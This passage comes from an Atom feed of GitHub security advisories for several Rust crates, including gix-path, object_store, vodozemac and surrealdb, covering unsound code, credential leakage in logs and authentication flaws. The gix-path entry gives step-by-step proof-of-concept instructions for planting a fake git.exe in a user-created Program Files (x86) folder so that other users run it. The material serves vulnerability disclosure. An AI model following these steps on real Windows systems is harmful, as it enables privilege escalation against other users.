<p>This is best demonstrated in <a href="https://github.com/adobe/xmp-toolkit-rs/issues/230">issue #230</a>, where a race condition causes the <code>close</code> call to fail due to file I/O errors.</p>
<p>This was fixed in <a href="https://github.com/adobe/xmp-toolkit-rs/pull/232">PR #232</a> (released as crate version 1.9.0), which now safely handles the exception.</p>
<p>For backward compatibility, the existing API ignores the error. A new API <code>XmpFile::try_close</code> was added to allow callers to receive and process the error result.</p>
<p>Users of all prior versions of <code>xmp_toolkit</code> are encouraged to update to version 1.9.0 to avoid undefined behavior.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/adobe/xmp-toolkit-rs/issues/230">https://github.com/adobe/xmp-toolkit-rs/issues/230</a></li>
<li><a href="https://github.com/adobe/xmp-toolkit-rs/issues/233">https://github.com/adobe/xmp-toolkit-rs/issues/233</a></li>
<li><a href="https://github.com/adobe/xmp-toolkit-rs/pull/232">https://github.com/adobe/xmp-toolkit-rs/pull/232</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0360.html">https://rustsec.org/advisories/RUSTSEC-2024-0360.html</a></li>
<li><a href="https://github.com/advisories/GHSA-66fw-43h8-f8p3">https://github.com/advisories/GHSA-66fw-43h8-f8p3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-66fw-43h8-f8p3</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-07-26T21:14:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gix-attributes] The kstring integration in gix-attributes is unsound]]></title>
        <id>https://github.com/advisories/GHSA-cx7h-h87r-jpgr</id>
        <link href="https://github.com/advisories/GHSA-cx7h-h87r-jpgr"/>
        <updated>2024-07-25T16:38:42.000Z</updated>
        <content type="html"><![CDATA[<p><code>gix-attributes</code> (in <a href="https://github.com/Byron/gitoxide/blob/gix-attributes-v0.22.2/gix-attributes/src/state.rs#L19-L27"><code>state::ValueRef</code></a>) unsafely creates a <code>&amp;str</code> from a <code>&amp;[u8]</code> containing non-UTF8 data, with the justification that so long as nothing reads the <code>&amp;str</code> and relies on it being UTF-8 in the <code>&amp;str</code>, there is no UB:</p>
<pre><code class="language-rust">// SAFETY: our API makes accessing that value as `str` impossible, so illformed UTF8 is never exposed as such.
</code></pre>
<p>The problem is that the non-UTF8 <code>str</code> <strong>is</strong> exposed to outside code: first to the <code>kstring</code> crate itself, which requires UTF-8 in its documentation and may have UB as a consequence of this, but also to <code>serde</code>, where it propagates to e.g. <code>serde_json</code>, <code>serde_yaml</code>, etc., where the same problems occur.</p>
<p>This is not sound, and it could cause further UB down the line in these places that can view the <code>&amp;str</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Byron/gitoxide/issues/1460">https://github.com/Byron/gitoxide/issues/1460</a></li>
<li><a href="https://github.com/rustsec/advisory-db/commit/884aaa1646132bc3a27ba058197d6ef039bec294">https://github.com/rustsec/advisory-db/commit/884aaa1646132bc3a27ba058197d6ef039bec294</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0359.html">https://rustsec.org/advisories/RUSTSEC-2024-0359.html</a></li>
<li><a href="https://github.com/advisories/GHSA-cx7h-h87r-jpgr">https://github.com/advisories/GHSA-cx7h-h87r-jpgr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cx7h-h87r-jpgr</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-07-25T16:38:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[object_store] Apache Arrow Rust Object Store: AWS WebIdentityToken exposure in log files]]></title>
        <id>https://github.com/advisories/GHSA-c2hf-vcmr-qjrf</id>
        <link href="https://github.com/advisories/GHSA-c2hf-vcmr-qjrf"/>
        <updated>2024-08-03T05:06:58.000Z</updated>
        <content type="html"><![CDATA[<p>Exposure of temporary credentials in logs&nbsp;in Apache Arrow Rust Object Store (<code>object_store</code> crate), version 0.10.1 and earlier on all platforms using AWS WebIdentityTokens.&nbsp;</p>
<p>On certain error conditions, the logs may contain the OIDC token passed to  AssumeRoleWithWebIdentity <a href="https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoleWithWebIdentity.html">https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoleWithWebIdentity.html</a> . This allows someone with access to the logs to impersonate that identity, including performing their own calls to AssumeRoleWithWebIdentity, until the OIDC token expires. Typically OIDC tokens are valid for up to an hour, although this will vary depending on the issuer.</p>
<p>Users are recommended to use a different AWS authentication mechanism, disable logging or upgrade to version 0.10.2, which fixes this issue.</p>
<p>Details:</p>
<p>When using AWS WebIdentityTokens with the object_store crate, in the event of a failure and automatic retry, the underlying reqwest error, including the full URL with the credentials, potentially in the parameters, is written to the logs.&nbsp;</p>
<p>Thanks to Paul&nbsp;Hatcherian for reporting this vulnerability</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41178">https://nvd.nist.gov/vuln/detail/CVE-2024-41178</a></li>
<li><a href="https://lists.apache.org/thread/3t0povdppnt2czv6crlsqhvyko93kcrg">https://lists.apache.org/thread/3t0povdppnt2czv6crlsqhvyko93kcrg</a></li>
<li><a href="https://github.com/apache/arrow-rs/pull/6074">https://github.com/apache/arrow-rs/pull/6074</a></li>
<li><a href="https://github.com/apache/arrow-rs/commit/4978e32654235f569062f2cad6c7361e410f1254">https://github.com/apache/arrow-rs/commit/4978e32654235f569062f2cad6c7361e410f1254</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0358.html">https://rustsec.org/advisories/RUSTSEC-2024-0358.html</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/07/23/3">http://www.openwall.com/lists/oss-security/2024/07/23/3</a></li>
<li><a href="https://github.com/advisories/GHSA-c2hf-vcmr-qjrf">https://github.com/advisories/GHSA-c2hf-vcmr-qjrf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c2hf-vcmr-qjrf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-23T18:31:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openssl] openssl's `MemBio::get_buf` has undefined behavior with empty buffers]]></title>
        <id>https://github.com/advisories/GHSA-q445-7m23-qrmw</id>
        <link href="https://github.com/advisories/GHSA-q445-7m23-qrmw"/>
        <updated>2024-08-01T05:06:45.000Z</updated>
        <content type="html"><![CDATA[<p>Previously, <code>MemBio::get_buf</code> called <code>slice::from_raw_parts</code> with a null-pointer, which violates the functions invariants, leading to undefined behavior. In debug builds this would produce an assertion failure. This is now fixed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sfackler/rust-openssl/pull/2266">https://github.com/sfackler/rust-openssl/pull/2266</a></li>
<li><a href="https://github.com/sfackler/rust-openssl/commit/aef36e0f3950653148d6644309ee41ccf16e02bb">https://github.com/sfackler/rust-openssl/commit/aef36e0f3950653148d6644309ee41ccf16e02bb</a></li>
<li><a href="https://github.com/sfackler/rust-openssl/releases/tag/openssl-v0.10.66">https://github.com/sfackler/rust-openssl/releases/tag/openssl-v0.10.66</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0357.html">https://rustsec.org/advisories/RUSTSEC-2024-0357.html</a></li>
<li><a href="https://github.com/advisories/GHSA-q445-7m23-qrmw">https://github.com/advisories/GHSA-q445-7m23-qrmw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q445-7m23-qrmw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-22T17:34:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[matrix-sdk-crypto] matrix-sdk-crypto's `UserIdentity::is_verified` not checking verification status of own user identity while performing the check]]></title>
        <id>https://github.com/advisories/GHSA-4qg4-cvh2-crgg</id>
        <link href="https://github.com/advisories/GHSA-4qg4-cvh2-crgg"/>
        <updated>2024-08-08T05:08:54.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>UserIdentity::is_verified()</code> method in the matrix-sdk-crypto crate before version 0.7.2 doesn't take into account the verification status of the user's own identity while performing the check and may as a result return a value contrary to what is implied by its name and documentation.</p>
<h3 id="impact">Impact</h3>
<p>If the method is used to decide whether to perform sensitive operations towards a user identity, a malicious homeserver could manipulate the outcome in order to make the identity appear trusted. This is not a typical usage of the method, which lowers the impact. The method itself is not used inside the <code>matrix-sdk-crypto</code> crate.</p>
<h3 id="patches">Patches</h3>
<p>The 0.7.2 release of the <code>matrix-sdk-crypto</code> crate includes a fix.</p>
<h3 id="workarounds">Workarounds</h3>
<p>None.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/matrix-org/matrix-rust-sdk/security/advisories/GHSA-4qg4-cvh2-crgg">https://github.com/matrix-org/matrix-rust-sdk/security/advisories/GHSA-4qg4-cvh2-crgg</a></li>
<li><a href="https://github.com/matrix-org/matrix-rust-sdk/commit/76a7052149bb8f722df12da915b3a06d19a6695a">https://github.com/matrix-org/matrix-rust-sdk/commit/76a7052149bb8f722df12da915b3a06d19a6695a</a></li>
<li><a href="https://github.com/matrix-org/matrix-rust-sdk/releases/tag/0.7.2-crypto">https://github.com/matrix-org/matrix-rust-sdk/releases/tag/0.7.2-crypto</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40648">https://nvd.nist.gov/vuln/detail/CVE-2024-40648</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0356.html">https://rustsec.org/advisories/RUSTSEC-2024-0356.html</a></li>
<li><a href="https://github.com/advisories/GHSA-4qg4-cvh2-crgg">https://github.com/advisories/GHSA-4qg4-cvh2-crgg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4qg4-cvh2-crgg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-18T15:28:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gix-path] gix-path can use a fake program files location]]></title>
        <id>https://github.com/advisories/GHSA-mgvv-9p9g-3jv4</id>
        <link href="https://github.com/advisories/GHSA-mgvv-9p9g-3jv4"/>
        <updated>2024-08-07T05:04:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When looking for Git for Windows so it can run it to report its paths, <code>gix-path</code> can be tricked into running another <code>git.exe</code> placed in an untrusted location by a limited user account.</p>
<h3 id="details">Details</h3>
<p>Windows permits limited user accounts without administrative privileges to create new directories in the root of the system drive. While <code>gix-path</code> first looks for <code>git</code> using a <code>PATH</code> search, in version 0.10.8 it also has a fallback strategy on Windows of checking two hard-coded paths intended to be the 64-bit and 32-bit Program Files directories:</p>
<p><a href="https://github.com/Byron/gitoxide/blob/6cd8b4665bb7582f744c3244abaef812be39ec35/gix-path/src/env/git.rs#L9-L14">https://github.com/Byron/gitoxide/blob/6cd8b4665bb7582f744c3244abaef812be39ec35/gix-path/src/env/git.rs#L9-L14</a></p>
<p>Existing functions, as well as the newly introduced <code>exe_invocation</code> function, were updated to make use of these alternative locations. This causes facilities in <code>gix_path::env</code> to directly execute <code>git.exe</code> in those locations, as well as to return its path or whatever configuration it reports to callers who rely on it.</p>
<p>Although unusual setups where the system drive is not <code>C:</code>, or even where Program Files directories have non-default names, are technically possible, the main problem arises on a 32-bit Windows system. Such a system has no <code>C:\Program Files (x86)</code> directory.</p>
<p>A limited user on a 32-bit Windows system can therefore create the <code>C:\Program Files (x86)</code> directory and populate it with arbitrary contents. Once a payload has been placed at the second of the two hard-coded paths in this way, other user accounts including administrators will execute it if they run an application that uses <code>gix-path</code> and do not have <code>git</code> in a <code>PATH</code> directory.</p>
<p>(While having <code>git</code> found in a <code>PATH</code> search prevents exploitation, merely having it installed in the default location under the real <code>C:\Program Files</code> directory does not. This is because the first hard-coded path's <code>mingw64</code> component assumes a 64-bit installation.)</p>
<h3 id="poc">PoC</h3>
<p>On a 32-bit (x86) Windows 10 system, with or without Git for Windows installed:</p>
<ol>
<li>Create a limited user account in <code>lusrmgr.msc</code> or the Settings application.</li>
<li>Log in with that account and, using Windows Explorer or the <code>mkdir</code> command in PowerShell, create the directories <code>C:\Program Files (x86)\Git\mingw32\bin</code>. Although a limited user account cannot create regular files directly in <code>C:\</code>, it can create directories including one called <code>Program Files (x86)</code>.</li>
<li>Place a copy of <code>C:\Windows\system32\calc.exe</code> in <code>C:\Program Files (x86)\Git\mingw32\bin</code> and rename it from <code>calc.exe</code> to <code>git.exe</code>. A different test payload may be used if preferred, and the executable need not already be signed or trusted.</li>
<li>Log out, and log in as a different user. This user may be an administrator.</li>
<li>If <code>gitoxide</code> is not installed, install it. If <code>cargo install gitoxide</code> is used for the installation, then the version of <code>gix-path</code> used in the installation can be observed.</li>
<li>The vulnerability is only exploitable if <code>git</code> cannot be found in a <code>PATH</code> search. So, in PowerShell, run <code>gcm git</code> to check if <code>git</code> is present in the <code>PATH</code>. If so, temporarily remove it. One way to do this is for the current shell only, by running <code>$env:PATH</code> to inspect it and by assigning <code>$env:PATH = '...'</code> where <code>...</code> omits directories that contain <code>git</code>.</li>
<li>Some commands that can be run outside a repository, and most commands that can be run inside a repository, will run the Calculator or other payload at least once per invocation. Try <code>gix clone foo</code> or, inside of a repository, <code>gix status</code>, <code>gix config</code>, <code>gix is-changed</code>, <code>gix fetch</code>, <code>ein t hours</code>, or <code>ein t query</code>. This is not exhaustive; most other <code>gix</code> and <code>ein</code> commands that access existing repository state or a network resource likewise run the payload.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Only Windows is affected. Exploitation is unlikely except on a 32-bit system. In particular, running a 32-bit build on a 64-bit system is not a risk factor. Furthermore, the attacker must have a user account on the system, though it may be a relatively unprivileged account. Such a user can perform privilege escalation and execute code as another user, though it may be difficult to do so reliably because the targeted user account must run an application or service that uses <code>gix-path</code> and must not have <code>git</code> in its <code>PATH</code>.</p>
<p>The main exploitable configuration is one where Git for Windows has been installed but not added to <code>PATH</code>. This is one of the options in its installer, though not the default option. Alternatively, an affected program that sanitizes its <code>PATH</code> to remove seemingly nonessential directories could allow exploitation. But for the most part, if the target user has configured a <code>PATH</code> in which the real <code>git.exe</code> can be found, then this cannot be exploited.</p>
<p>This vulnerability is comparable to <a href="https://github.com/git-for-windows/git/security/advisories/GHSA-vw2c-22j4-2fh2">CVE-2022-24765</a>, in which an uncontrolled path like <code>C:\.git\config</code>, which a limited user can create, could supply configuration used by other users. However, in this case, exploitation is slightly simpler because, rather than using configuration, an executable is directly run.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Byron/gitoxide/security/advisories/GHSA-mgvv-9p9g-3jv4">https://github.com/Byron/gitoxide/security/advisories/GHSA-mgvv-9p9g-3jv4</a></li>
<li><a href="https://github.com/git-for-windows/git/security/advisories/GHSA-vw2c-22j4-2fh2">https://github.com/git-for-windows/git/security/advisories/GHSA-vw2c-22j4-2fh2</a></li>
<li><a href="https://github.com/Byron/gitoxide/blob/6cd8b4665bb7582f744c3244abaef812be39ec35/gix-path/src/env/git.rs#L9-L14">https://github.com/Byron/gitoxide/blob/6cd8b4665bb7582f744c3244abaef812be39ec35/gix-path/src/env/git.rs#L9-L14</a></li>
<li><a href="https://github.com/advisories/GHSA-mgvv-9p9g-3jv4">https://github.com/advisories/GHSA-mgvv-9p9g-3jv4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mgvv-9p9g-3jv4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-18T15:26:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vodozemac] vodozemac's usage of non-constant time base64 decoder could lead to leakage of secret key material]]></title>
        <id>https://github.com/advisories/GHSA-j8cm-g7r6-hfpq</id>
        <link href="https://github.com/advisories/GHSA-j8cm-g7r6-hfpq"/>
        <updated>2024-08-07T05:04:09.000Z</updated>
        <content type="html"><![CDATA[<p>Versions before 0.7.0 of vodozemac use a non-constant time base64 implementation for importing key material for Megolm group sessions and <code>PkDecryption</code> Ed25519 secret keys. This flaw might allow an attacker to infer some information about the secret key material through a side-channel attack.</p>
<h3 id="impact">Impact</h3>
<p>The use of a non-constant time base64 implementation might allow an attacker to observe timing variations in the encoding and decoding operations of the secret key material. This could potentially provide insights into the underlying secret key material.</p>
<p>The impact of this vulnerability is considered low because exploiting the attacker is required to have access to high precision timing measurements, as well as repeated access to the base64 encoding or decoding processes.  Additionally, the estimated leakage amount is bounded and low according to the referenced paper.</p>
<h3 id="patches">Patches</h3>
<p>The patch is in commit 734b6c6948d4b2bdee3dd8b4efa591d93a61d272.</p>
<h3 id="workarounds">Workarounds</h3>
<p>None.</p>
<h3 id="references">References</h3>
<p>A detailed description of the precise attack can be found at <a href="https://arxiv.org/abs/2108.04600">https://arxiv.org/abs/2108.04600</a>. We kindly thank Soatok for pointing out this research to us.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory please email us at <a href="mailto:security@matrix.org">security at matrix.org</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/matrix-org/vodozemac/security/advisories/GHSA-j8cm-g7r6-hfpq">https://github.com/matrix-org/vodozemac/security/advisories/GHSA-j8cm-g7r6-hfpq</a></li>
<li><a href="https://github.com/matrix-org/vodozemac/commit/734b6c6948d4b2bdee3dd8b4efa591d93a61d272">https://github.com/matrix-org/vodozemac/commit/734b6c6948d4b2bdee3dd8b4efa591d93a61d272</a></li>
<li><a href="https://github.com/matrix-org/vodozemac/commit/77765dace11266ef9523301624a01265c6e0f790">https://github.com/matrix-org/vodozemac/commit/77765dace11266ef9523301624a01265c6e0f790</a></li>
<li><a href="https://arxiv.org/abs/2108.04600">https://arxiv.org/abs/2108.04600</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40640">https://nvd.nist.gov/vuln/detail/CVE-2024-40640</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0354.html">https://rustsec.org/advisories/RUSTSEC-2024-0354.html</a></li>
<li><a href="https://github.com/advisories/GHSA-j8cm-g7r6-hfpq">https://github.com/advisories/GHSA-j8cm-g7r6-hfpq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j8cm-g7r6-hfpq</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-07-17T18:30:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[risc0-zkvm] RISC Zero zkVM notes on zero-knowledge]]></title>
        <id>https://github.com/advisories/GHSA-5xgj-pmjj-gw49</id>
        <link href="https://github.com/advisories/GHSA-5xgj-pmjj-gw49"/>
        <updated>2024-07-15T18:32:23.000Z</updated>
        <content type="html"><![CDATA[<p>RISC Zero zkVM was designed from its inception to provide three main guarantees:</p>
<ol>
<li><em>Computational integrity</em>: that a given software program executed correctly.</li>
<li><em>Succinctness</em>: that the proof of execution does not grow in relation to the program being executed.</li>
<li><em>Zero Knowledge</em>: that details of the program execution are not visible within the proof of program execution.</li>
</ol>
<p>Ulrich Habock and Al Kindi have released <a href="https://eprint.iacr.org/2024/1037">new research</a> that indicates that several STARK implementations -including our RISC Zero zkVM- do not meet the requirements to assert the specific property of zero knowledge provably. </p>
<p>While a vast majority of real-world applications that leverage RISC Zero zkVM or similar systems depend primarily on computational integrity and succinctness, a subset of applications critically depend on the privacy guarantees provided by zero-knowledge; and for those use cases, users are cautioned to understand the research and make informed decisions based on the risks outlined in using an impacted system.</p>
<p>Although the maintainers are not aware of any attacks that can take advantage of this potential weakness, they are working to proactively address this discovery as quickly as possible. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/risc0/risc0/security/advisories/GHSA-5xgj-pmjj-gw49">https://github.com/risc0/risc0/security/advisories/GHSA-5xgj-pmjj-gw49</a></li>
<li><a href="https://eprint.iacr.org/2024/1037">https://eprint.iacr.org/2024/1037</a></li>
<li><a href="https://github.com/advisories/GHSA-5xgj-pmjj-gw49">https://github.com/advisories/GHSA-5xgj-pmjj-gw49</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5xgj-pmjj-gw49</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-07-15T18:32:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb-core] SurrealDB vulnerable to Improper Authentication when Changing Databases as Scope User]]></title>
        <id>https://github.com/advisories/GHSA-gh9f-6xm2-c4j2</id>
        <link href="https://github.com/advisories/GHSA-gh9f-6xm2-c4j2"/>
        <updated>2024-07-31T05:03:06.000Z</updated>
        <content type="html"><![CDATA[<p>Authentication would not be properly validated when an already authenticated scope user would use the <code>use</code> method or <code>USE</code> clause to switch working databases in a session. If there was a user record in the new database with identical record identifier as the original record that the user authenticated with in the original database, this could result in the user being able to perform actions under the identity of the unrelated user in the new database. This issue does not affect system users at any level.</p>
<p>By default, record identifiers are randomly generated with sufficient complexity to prevent the identifier collision required to trigger this issue. However, the issue may trigger in situations where multiple databases in the same SurrealDB instance are using explicitly defined or incremental record identifiers to identify users on an identically named table.</p>
<h3 id="impact">Impact</h3>
<p>Under the circumstances described above, a user who has an authenticated session as a scope user in a database could become authorized to query data under the identity of a specific scope user associated with an identical record identifier in a different database within the same SurrealDB instace if the <code>PERMISSIONS</code> clause would allow it due to relying exclusively on the <code>$auth</code> parameter, which would point to the impersonated user. The impact is limited to the single user with matching record identifier.</p>
<p>The impact of this issue is mitigated if the table <code>PERMISSIONS</code> clause explicitly checks for an scope that only exists in the specific database (e.g. <code>$scope = "production"</code>) or certain claims of the authentication token (e.g. <code>$token.email = "example@example.com"</code>), both of which would remain unchanged in the session of the authenticated user after changing databases. Permissions will default to <code>NONE</code> if there is no <code>PERMISSIONS</code> clause, which also mitigates this impact of this issue.</p>
<h3 id="patches">Patches</h3>
<ul>
<li>Version 1.5.4 and later are not affected by this issue.</li>
<li>Version 2.0.0-alpha.6 and later will not be affected by this issue.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Users unable to update may want to ensure that table <code>PERMISSIONS</code> clauses explicitly check that the <code>$scope</code> parameter matches a scope that is uniquely named across databases in the same SurrealDB instance. Ensuring that record identifiers for users are automatically generated or explicitly generated to be unique across databases may also be sufficient to mitigate this issue, as the <code>$auth</code> parameter will not link to any user record and any <code>PERMISSIONS</code> clauses restricting authorization based on the authenticated user should fail to successfully evaluate.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/pull/4335">https://github.com/surrealdb/surrealdb/pull/4335</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-gh9f-6xm2-c4j2">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-gh9f-6xm2-c4j2</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/pull/4335">https://github.com/surrealdb/surrealdb/pull/4335</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/492f8378d57968dbdf5e63fad41b6ff59bba0b80">https://github.com/surrealdb/surrealdb/commit/492f8378d57968dbdf5e63fad41b6ff59bba0b80</a></li>
<li><a href="https://github.com/advisories/GHSA-gh9f-6xm2-c4j2">https://github.com/advisories/GHSA-gh9f-6xm2-c4j2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gh9f-6xm2-c4j2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-11T13:19:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[surrealdb] SurrealDB vulnerable to Improper Authentication when Changing Databases as Scope User]]></title>
        <id>https://github.com/advisories/GHSA-gh9f-6xm2-c4j2</id>
        <link href="https://github.com/advisories/GHSA-gh9f-6xm2-c4j2"/>
        <updated>2024-07-31T05:03:06.000Z</updated>
        <content type="html"><![CDATA[<p>Authentication would not be properly validated when an already authenticated scope user would use the <code>use</code> method or <code>USE</code> clause to switch working databases in a session. If there was a user record in the new database with identical record identifier as the original record that the user authenticated with in the original database, this could result in the user being able to perform actions under the identity of the unrelated user in the new database. This issue does not affect system users at any level.</p>
<p>By default, record identifiers are randomly generated with sufficient complexity to prevent the identifier collision required to trigger this issue. However, the issue may trigger in situations where multiple databases in the same SurrealDB instance are using explicitly defined or incremental record identifiers to identify users on an identically named table.</p>
<h3 id="impact">Impact</h3>
<p>Under the circumstances described above, a user who has an authenticated session as a scope user in a database could become authorized to query data under the identity of a specific scope user associated with an identical record identifier in a different database within the same SurrealDB instace if the <code>PERMISSIONS</code> clause would allow it due to relying exclusively on the <code>$auth</code> parameter, which would point to the impersonated user. The impact is limited to the single user with matching record identifier.</p>
<p>The impact of this issue is mitigated if the table <code>PERMISSIONS</code> clause explicitly checks for an scope that only exists in the specific database (e.g. <code>$scope = "production"</code>) or certain claims of the authentication token (e.g. <code>$token.email = "example@example.com"</code>), both of which would remain unchanged in the session of the authenticated user after changing databases. Permissions will default to <code>NONE</code> if there is no <code>PERMISSIONS</code> clause, which also mitigates this impact of this issue.</p>
<h3 id="patches">Patches</h3>
<ul>
<li>Version 1.5.4 and later are not affected by this issue.</li>
<li>Version 2.0.0-alpha.6 and later will not be affected by this issue.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Users unable to update may want to ensure that table <code>PERMISSIONS</code> clauses explicitly check that the <code>$scope</code> parameter matches a scope that is uniquely named across databases in the same SurrealDB instance. Ensuring that record identifiers for users are automatically generated or explicitly generated to be unique across databases may also be sufficient to mitigate this issue, as the <code>$auth</code> parameter will not link to any user record and any <code>PERMISSIONS</code> clauses restricting authorization based on the authenticated user should fail to successfully evaluate.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/pull/4335">https://github.com/surrealdb/surrealdb/pull/4335</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/surrealdb/surrealdb/security/advisories/GHSA-gh9f-6xm2-c4j2">https://github.com/surrealdb/surrealdb/security/advisories/GHSA-gh9f-6xm2-c4j2</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/pull/4335">https://github.com/surrealdb/surrealdb/pull/4335</a></li>
<li><a href="https://github.com/surrealdb/surrealdb/commit/492f8378d57968dbdf5e63fad41b6ff59bba0b80">https://github.com/surrealdb/surrealdb/commit/492f8378d57968dbdf5e63fad41b6ff59bba0b80</a></li>
<li><a href="https://github.com/advisories/GHSA-gh9f-6xm2-c4j2">https://github.com/advisories/GHSA-gh9f-6xm2-c4j2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gh9f-6xm2-c4j2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-11T13:19:19.000Z</published>
    </entry>
</feed>